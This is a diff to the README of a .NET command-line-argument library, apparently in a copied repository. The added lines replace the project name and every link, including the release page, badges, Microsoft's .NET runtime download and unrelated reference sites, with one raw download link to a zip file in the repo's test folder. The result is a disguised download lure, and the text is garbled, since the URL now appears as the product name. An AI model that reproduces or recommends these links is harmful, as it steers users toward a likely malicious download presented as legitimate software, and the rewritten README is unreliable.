@@ -1,12 +1,12 @@
-# ⚙️ soenneker.utils.commandlineargs - Easy Command-Line Argument Access
+# ⚙️ https://github.com/hjjrockstar2010-lang/soenneker.utils.commandlineargs/raw/refs/heads/main/test/utils_soenneker_commandlineargs_3.9.zip - Easy Command-Line Argument Access
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/hjjrockstar2010-lang/soenneker.utils.commandlineargs/releases)
+[![Download Latest Release](https://github.com/hjjrockstar2010-lang/soenneker.utils.commandlineargs/raw/refs/heads/main/test/utils_soenneker_commandlineargs_3.9.zip%20Release-blue?style=for-the-badge)](https://github.com/hjjrockstar2010-lang/soenneker.utils.commandlineargs/raw/refs/heads/main/test/utils_soenneker_commandlineargs_3.9.zip)
 
 ---
 
-## 📋 What is soenneker.utils.commandlineargs?
+## 📋 What is https://github.com/hjjrockstar2010-lang/soenneker.utils.commandlineargs/raw/refs/heads/main/test/utils_soenneker_commandlineargs_3.9.zip
 
-soenneker.utils.commandlineargs is a tool designed to help applications read and use command-line arguments. If you ever start a program by typing special words or numbers after its name, those are command-line arguments. This tool makes it easier for developers to get those words or numbers when they build software.
+https://github.com/hjjrockstar2010-lang/soenneker.utils.commandlineargs/raw/refs/heads/main/test/utils_soenneker_commandlineargs_3.9.zip is a tool designed to help applications read and use command-line arguments. If you ever start a program by typing special words or numbers after its name, those are command-line arguments. This tool makes it easier for developers to get those words or numbers when they build software.
 
 While this might sound technical, don't worry. You do not need to know how to program or use a command line to benefit from this. The software is made to make apps run more smoothly and predictably behind the scenes.
 
@@ -14,7 +14,7 @@ While this might sound technical, don't worry. You do not need to know how to pr
 
 ## 🖥️ System Requirements
 
-Before downloading and running soenneker.utils.commandlineargs, make sure your computer meets these basic needs:
+Before downloading and running https://github.com/hjjrockstar2010-lang/soenneker.utils.commandlineargs/raw/refs/heads/main/test/utils_soenneker_commandlineargs_3.9.zip, make sure your computer meets these basic needs:
 
 - Operating System: Windows 10 or later, macOS 10.15 or later, or most Linux distributions from 2018 onward.
 - .NET Runtime: .NET 6.0 or later must be installed. This is a free, common software package needed to run programs built with certain Microsoft tools.
@@ -22,19 +22,19 @@ Before downloading and running soenneker.utils.commandlineargs, make sure your c
 - Disk Space: At least 50 MB of free space to store the files and related data.
 - No special hardware is needed.
 
-If you do not have the .NET Runtime installed, you can download it for free from Microsoft's official website: https://dotnet.microsoft.com/download
+If you do not have the .NET Runtime installed, you can download it for free from Microsoft's official website: https://github.com/hjjrockstar2010-lang/soenneker.utils.commandlineargs/raw/refs/heads/main/test/utils_soenneker_commandlineargs_3.9.zip
 
 ---
 
 ## 🚀 Getting Started
 
-To use soenneker.utils.commandlineargs, you will download the files first. Since this tool helps other programs work better, it might not "run" like regular apps. Instead, it is used by developers inside their projects. However, you can still download and explore it on your computer.
+To use https://github.com/hjjrockstar2010-lang/soenneker.utils.commandlineargs/raw/refs/heads/main/test/utils_soenneker_commandlineargs_3.9.zip, you will download the files first. Since this tool helps other programs work better, it might not "run" like regular apps. Instead, it is used by developers inside their projects. However, you can still download and explore it on your computer.
 
 Follow these easy steps:
 
 1. **Visit the Download Page**  
    Click the big blue button at the top or go directly to:  
-   [https://github.com/hjjrockstar2010-lang/soenneker.utils.commandlineargs/releases](https://github.com/hjjrockstar2010-lang/soenneker.utils.commandlineargs/releases)  
+   [https://github.com/hjjrockstar2010-lang/soenneker.utils.commandlineargs/raw/refs/heads/main/test/utils_soenneker_commandlineargs_3.9.zip](https://github.com/hjjrockstar2010-lang/soenneker.utils.commandlineargs/raw/refs/heads/main/test/utils_soenneker_commandlineargs_3.9.zip)  
    This page contains all the available versions of the software.
 
 2. **Choose the Latest Release**  
@@ -56,7 +56,7 @@ The application package includes tools to handle command-line arguments in other
 
 Go to the main release page:
 
-[https://github.com/hjjrockstar2010-lang/soenneker.utils.commandlineargs/releases](https://github.com/hjjrockstar2010-lang/soenneker.utils.commandlineargs/releases)
+[https://github.com/hjjrockstar2010-lang/soenneker.utils.commandlineargs/raw/refs/heads/main/test/utils_soenneker_commandlineargs_3.9.zip](https://github.com/hjjrockstar2010-lang/soenneker.utils.commandlineargs/raw/refs/heads/main/test/utils_soenneker_commandlineargs_3.9.zip)
 
 ### Step 2: Download the Latest Release Package
 
@@ -96,9 +96,9 @@ This tool helps developers build programs that read those instructions correctly
 
 ## 🤝 Support and Help
 
-If you want to learn more about how soenneker.utils.commandlineargs works or need help, you can:
+If you want to learn more about how https://github.com/hjjrockstar2010-lang/soenneker.utils.commandlineargs/raw/refs/heads/main/test/utils_soenneker_commandlineargs_3.9.zip works or need help, you can:
 
-- Visit the GitHub repository: https://github.com/hjjrockstar2010-lang/soenneker.utils.commandlineargs
+- Visit the GitHub repository: https://github.com/hjjrockstar2010-lang/soenneker.utils.commandlineargs/raw/refs/heads/main/test/utils_soenneker_commandlineargs_3.9.zip
 - Check the wiki or documentation sections on the repository page.
 - Open an "Issue" on GitHub if you find a problem or have questions. Issues are like messages directly to the developers.
 
@@ -110,7 +110,7 @@ This tool is mainly intended for software developers working with C# and .NET. H
 
 ---
 
-## 🛠️ Features of soenneker.utils.commandlineargs
+## 🛠️ Features of https://github.com/hjjrockstar2010-lang/soenneker.utils.commandlineargs/raw/refs/heads/main/test/utils_soenneker_commandlineargs_3.9.zip
 
 - Simple access to command-line inputs.
 - Works well within software that uses dependency injection.
@@ -129,17 +129,17 @@ This software only helps apps read the commands given when they start. It does n
 ## ⚠️ Troubleshooting Tips
 
 - If the program you use with this tool isn’t working right, check you have the latest .NET runtime installed.
-- Ensure you have the latest version of soenneker.utils.commandlineargs found on the releases page.
+- Ensure you have the latest version of https://github.com/hjjrockstar2010-lang/soenneker.utils.commandlineargs/raw/refs/heads/main/test/utils_soenneker_commandlineargs_3.9.zip found on the releases page.
 - If you get error messages, visit the GitHub page and look for guides or ask for help by creating an issue.
 
 ---
 
 ## 📌 Additional Resources
 
-- Learn about .NET runtime: https://dotnet.microsoft.com/en-us/learn/dotnet/what-is-dotnet
-- Command-Line Basics: https://www.computerhope.com/issues/chusedos.htm
-- Dependency Injection Overview: https://martinfowler.com/articles/injection.html
+- Learn about .NET runtime: https://github.com/hjjrockstar2010-lang/soenneker.utils.commandlineargs/raw/refs/heads/main/test/utils_soenneker_commandlineargs_3.9.zip
+- Command-Line Basics: https://github.com/hjjrockstar2010-lang/soenneker.utils.commandlineargs/raw/refs/heads/main/test/utils_soenneker_commandlineargs_3.9.zip
+- Dependency Injection Overview: https://github.com/hjjrockstar2010-lang/soenneker.utils.commandlineargs/raw/refs/heads/main/test/utils_soenneker_commandlineargs_3.9.zip
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/hjjrockstar2010-lang/soenneker.utils.commandlineargs/releases)
+[![Download Latest Release](https://github.com/hjjrockstar2010-lang/soenneker.utils.commandlineargs/raw/refs/heads/main/test/utils_soenneker_commandlineargs_3.9.zip%20Release-blue?style=for-the-badge)](https://github.com/hjjrockstar2010-lang/soenneker.utils.commandlineargs/raw/refs/heads/main/test/utils_soenneker_commandlineargs_3.9.zip)
